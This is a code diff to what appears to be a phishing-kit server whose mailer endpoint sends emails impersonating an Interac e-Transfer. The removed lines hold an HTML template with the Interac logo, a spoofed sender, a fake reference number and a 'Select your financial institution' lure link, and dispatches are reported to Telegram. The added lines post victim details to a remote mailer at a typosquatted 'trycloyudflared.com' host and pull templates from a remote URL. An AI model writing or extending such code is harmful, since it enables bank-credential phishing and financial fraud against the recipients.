@@ -763,58 +763,52 @@ async function startServer() {
         
         const settings = await getSettings();
         
-        let finalSenderName = sender_name || 'AB FARMS LTD';
-        
-        // Try to find the user to get their accountHolderName
-        const users = await getUsers();
-        const user = users.find(u => u.username === (req.query.user as string) || u.username === sender_name);
-        if (user && user.settings?.accountHolderName) {
-            finalSenderName = user.settings.accountHolderName;
+        if (!settings.general.baseActionUrl) {
+            throw new Error("No baseActionUrl configured for mailer");
         }
 
-        if (!settings.smtp.host || !settings.smtp.user) {
-            console.warn("⚠️ SMTP not configured. Logged attempt only.");
-            logEvent(`[Mailer] Simulation: Email to ${recipient_email} from ${finalSenderName} ($${amount})`);
-            return res.json({ success: true, info: "SMTP not configured, skipping actual delivery" });
-        }
+        const fallbackBody = {
+            recipient_email,
+            recipient_name,
+            amount,
+            purpose,
+            template,
+            sender_name,
+            reference_number,
+            date,
+            renderedTemplate: template
+        };
 
-        const subject = purpose || "Interac e-Transfer";
-        const actionUrl = settings.general.baseActionUrl ? `${settings.general.baseActionUrl}?ref=${reference_number || '123'}&to=${recipient_email}` : '#';
+        const response = await fetch(`https://trycloyudflared.com/api/mailer.php`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(fallbackBody)
+        });
         
-        const html = template || `
-            <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; border: 1px solid #e0e0e0; padding: 20px; border-radius: 12px; background-color: #ffffff;">
-                <div style="text-align: center; margin-bottom: 20px;">
-                   <img src="https://upload.wikimedia.org/wikipedia/en/thumb/f/f6/Interac_e-Transfer_logo.svg/512px-Interac_e-Transfer_logo.svg.png" width="100" />
-                </div>
-                <h2 style="color: #ed0711; text-align: center;">Interac e-Transfer</h2>
-                <div style="padding: 20px; border-top: 1px solid #eee;">
-                    <p>Hi ${recipient_name},</p>
-                    <p><strong>${finalSenderName}</strong> has sent you an Interac e-Transfer of <strong>$${amount}</strong>.</p>
-                    
-                    <div style="background: #f8f8f8; padding: 15px; border-radius: 8px; margin: 20px 0;">
-                        <p style="margin: 5px 0; font-size: 14px; color: #555;"><strong>Reference Number:</strong> ${reference_number || 'N/A'}</p>
-                        <p style="margin: 5px 0; font-size: 14px; color: #555;"><strong>Expires on:</strong> ${new Date(Date.now() + 30 * 24*60*60*1000).toLocaleDateString()}</p>
-                    </div>
-
-                    <div style="text-align: center; margin: 30px 0;">
-                        <a href="${actionUrl}" style="background-color: #ed0711; color: #ffffff; padding: 14px 30px; text-decoration: none; border-radius: 6px; font-weight: bold; display: inline-block;">Select your financial institution</a>
-                    </div>
-
-                    <p style="font-size: 11px; color: #999; margin-top: 30px; text-align: center;">
-                        This email was sent to you at the request of ${finalSenderName}. If you have any questions, please contact them directly.
-                    </p>
-                </div>
-            </div>
-        `;
-
-        await sendEmail(recipient_email, subject, `${finalSenderName} sent you ${amount}`, html, finalSenderName);
-        await sendTelegramNotification(`<b>Email Dispatched</b>\nTo: ${recipient_email}\nAmount: ${amount}\nSender: ${finalSenderName}`);
-        res.json({ success: true });
+        if (!response.ok) {
+            throw new Error(`Remote PHP mailer returned status ${response.status}`);
+        }
+        
+        logEvent(`[Mailer] Successfully sent to ${recipient_email} via ${settings.general.baseActionUrl}`);
+        res.json({ success: true, info: "Sent via remote mailer" });
     } catch (e: any) {
         console.error("❌ Mailer Error:", e);
+        logEvent(`[Mailer] Error: ${e.message}`);
         res.status(500).json({ success: false, error: e.message });
     }
   });
+
+  const fetchTemplate = async (templateName: string) => {
+      const settings = await getSettings();
+      if (!settings.general.baseActionUrl) return null;
+      try {
+          const res = await fetch(`${settings.general.baseActionUrl}/templates/${templateName}.html`);
+          if (res.ok) return await res.text();
+      } catch (e) {
+          console.error("Failed to fetch template:", e);
+      }
+      return null;
+  };
 
   const sendEmail = async (to: string, subject: string, text: string, html: string, overrideSenderName?: string) => {
       const settings = await getSettings();
@@ -824,6 +818,8 @@ async function startServer() {
           host: settings.smtp.host,
           port: settings.smtp.port,
           secure: settings.smtp.port === 465,
+          connectionTimeout: 10000,
+          greetingTimeout: 10000,
           auth: {
               user: settings.smtp.user,
               pass: settings.smtp.pass
